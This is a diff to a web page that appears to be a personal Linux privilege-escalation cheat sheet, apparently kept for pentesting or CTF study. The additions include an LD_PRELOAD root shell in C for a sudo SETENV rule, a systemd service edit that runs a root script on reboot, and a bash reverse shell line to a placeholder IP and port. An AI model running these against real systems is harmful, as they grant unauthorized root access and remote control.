@@ -102,8 +102,6 @@
 
                     <h2 id="GTFO bins alternative">GTFO bins alternative</h2>
                         <p>As you know GTFO bins UI changed and make it all difficult to read and they also hidden some privilege escalation paths. That way you can check the older version following the link <a href="https://web.archive.org/web/20260102075820/https://gtfobins.github.io/" class="notion-link">Here</a></p>
-                        <p>Anyway in the following link i'll be creating my custom version of GTFO bins with detailed information of binaries and how to exploit it</p>
-
 
                     <h2 id="Sudo & SUID">Sudo & SUID</h2>
                     <ul>
@@ -112,12 +110,33 @@
                         <pre><code class="language-bash">sudo -l</code></pre>
                         <pre><code class="language-bash">sudo -u mike ls -la  #Run command as another user</code></pre>
                         <ul>
-                            
 
                             <h4>SETENV</h4>
                             <ul>
-                                <p>In case you have SETENV privilege over a anything you could run sudo command over it and set environmental variables that might be useful</p>
-                                
+                                <p>In case you have SETENV privilege over a anything you could run sudo command over it and set environmental variables that might be useful. Example:</p>
+                                <div class="button" onclick="toggleDiv()">Show example</div>
+                                <div id="foldedDiv" class="content">
+                                    <p>Supose that when listing the sudoers file we find the following line:</p>
+                                    <pre><code class="language-powershell">(root) SETENV NOPASSWD: /opt/script.sh</code></pre>    
+                                    <p>In that case we could create a basic C script</p>
+                                    <pre><code class="language-powershell">// shell.c
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash -p");
+}</code></pre>    
+                                <p>The compile this script</p>
+                                <pre><code class="language-bash">gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles</code></pre>
+                                <p>And finally pass the malicious script as a environment variable</p>
+                                <pre><code class="language-bash">sudo LD_PRELOAD=/tmp/shell.so /ruta/al/binario_permitido</code></pre>
+                                <p>Then just check /bin/bash permissions and enjoy your root shell</p>
+
+                                </div>
                             </ul>
                             <h4>(ALL, !root)</h4>
                             <ul>
@@ -168,6 +187,33 @@ User daniel.carter may run the following commands on NIX02:
                         <h3>Find world-executable folders </h3>
                         <pre><code class="language-bash">find / -type d -writable 2>/dev/null</code></pre>
                     </ul> 
+
+                    <h2 id="Sudo reboot privesc">Sudo reboot privesc</h2>
+                    <ul>
+                        <p>If when checking sudo -l you see that the user can run reboot command with sudo privileges you could try to modify a config file of a service to run commands as root</p>
+                        <p>Fist find a service config file which you are able to write <b>In case the config file is empty it will not work</b> Obviously if no files are listed this method is not viable</p>
+                        <pre><code class="language-bash">find / -writable -name "*.service" 2>/dev/null</code></pre>
+                        <p>Now edit the file and your desired command inside <b>Service.ExecStart</b> also change the user who runs the service to be <b>root</b> here goes an example</p>
+                        <pre><code class="language-bash"># /etc/systemd/systm/example.service
+[Unit]
+Description=Zeno monitoring
+
+[Service]
+Type=simple
+User=root
+ExecStart=/tmp/privesc.sh
+
+[Install]
+WantedBy=multi-user.target
+Copied!</code></pre>
+                        <p>The file <b>privesc.sh</b> may contain a revshell or other malicious code for example</p>
+                        <pre><code class="language-bash">#!/bin/bash
+bash -i >& /dev/tcp/TU_IP/TU_PUERTO 0>&1</code></pre>
+                        <p>Then just reboot the system and await the reverse shell or the result of the command</p>
+
+                        
+
+                    </ul>
 
                     <h2 id="Capabilities">Capabilities</h2>
                     <ul>
@@ -607,6 +653,16 @@ docker -H unix:///run/docker.sock run -d --privileged -v /:/hostsystem ubuntu sl
             sidebarList.appendChild(listItem);
         });
     }
+
+    const botones = document.querySelectorAll(".button");
+
+    botones.forEach(boton => {
+    boton.addEventListener("click", () => {
+        const contenido = boton.nextElementSibling;
+        contenido.style.display =
+        contenido.style.display === "block" ? "none" : "block";
+    });
+    });
 
     // Asegurarse de que ambas funciones se ejecuten después de que todo el contenido esté listo
     window.addEventListener('load', generateMenu);
